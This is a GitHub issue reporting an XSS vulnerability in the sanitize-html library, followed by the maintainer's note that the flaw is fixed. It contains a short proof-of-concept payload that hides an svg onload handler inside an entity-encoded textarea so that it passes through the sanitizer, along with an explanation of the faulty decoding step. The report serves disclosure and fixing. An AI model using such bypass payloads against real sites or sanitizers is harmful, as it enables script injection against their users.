## Description

[![@buglloc](https://avatars.githubusercontent.com/u/7323495?u=657a14355415670e83fc6176e21e1d9772146ec5&v=4&size=48)](/buglloc)[buglloc](https://github.com/buglloc)opened [on Mar 26, 2016](https://github.com/apostrophecms/sanitize-html/issues/100#issue-143689220)

If we allowed at least one `nonTextTags` the result is a potential XSS vulnerability.

PoC:

```
var sanitizeHtml = require('sanitize-html');

var dirty = '!<textarea>&lt;/textarea&gt;&lt;svg/onload=prompt`xs`&gt;</textarea>!';
var clean = sanitizeHtml(dirty, {
    allowedTags: [ 'textarea' ]
});

console.log(clean);

// !<textarea></textarea><svg/onload=prompt`xs`></textarea>!
```

Problem in [`ontext` method](https://github.com/punkave/sanitize-html/blob/master/index.js#L190-L205):

```
    ontext: function(text) {
      [...]

      if (nonTextTagsArray.indexOf(tag) !== -1) {
        result += text;
      }
```

`text` was already html-decoded, by `decodeEntities` htmlparser2 setting, so we can break text context and inject custom HTML-code

Fixed XSS attack vector via `textarea` tags (when explicitly allowed)…

…. Decided that `script` (obviously) and `style` (due to its own XSS vectors) cannot realistically be afforded any XSS protection if allowed, unless we add a full CSS parser. Thanks again to Andrew Krasichkov.
